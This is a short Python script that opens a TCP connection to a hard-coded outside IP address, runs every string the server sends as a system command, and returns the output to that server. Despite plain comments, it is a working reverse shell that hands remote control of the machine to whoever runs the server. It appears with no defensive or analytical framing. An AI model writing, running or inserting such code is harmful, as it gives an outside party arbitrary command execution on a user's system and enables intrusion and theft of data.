import socket
import subprocess

HOST = '185.233.80.120'  # Server address
PORT = 55555            # Server port

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    client_socket.connect((HOST, PORT))  # Connect to the server
    print(f"Connected to server at {HOST}:{PORT}")
    while True:
        try:
            data = client_socket.recv(1024).decode()  # Receive data from server
            if not data:  # Connection closed by server
                print("Server closed the connection.")
                break
            print(f"Received from server: {data}")

            # Run the command
            result = subprocess.run(data.split(), capture_output=True, text=True)
            print(f"Command output: {result.stdout}")

            # Send the command output back to the server
            client_socket.sendall(result.stdout.encode())
        except Exception as e:
            print(f"Error: {e}")
